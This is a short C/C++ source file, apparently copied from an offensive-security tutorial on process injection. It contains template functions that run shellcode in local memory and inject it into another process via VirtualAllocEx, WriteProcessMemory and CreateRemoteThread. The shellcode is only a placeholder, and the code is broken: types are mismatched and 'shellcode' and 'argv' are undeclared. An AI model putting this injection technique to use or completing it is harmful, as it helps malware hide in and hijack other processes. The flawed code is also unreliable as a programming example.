#include "Windows.h"
#include "stdafx.h"

//https://www.ired.team/offensive-security/code-injection-process-injection/process-injection

int local_thread(unsigned char shell) {
	shell = "\x00"; //shellcode

	void* exec = VirtualAlloc(0, sizeof shell, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, shellcode, sizeof shell);
	((void(*)())exec)();

	return 0;
}

int remote_thread(unsigned char shell) {

	shell = "\x00"; //shellcode

	HANDLE processHandle;
	HANDLE remoteThread;
	PVOID remoteBuffer;

	printf("Injecting to PID: %i", atoi(argv[1]));
	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	CloseHandle(processHandle);

	return 0;
}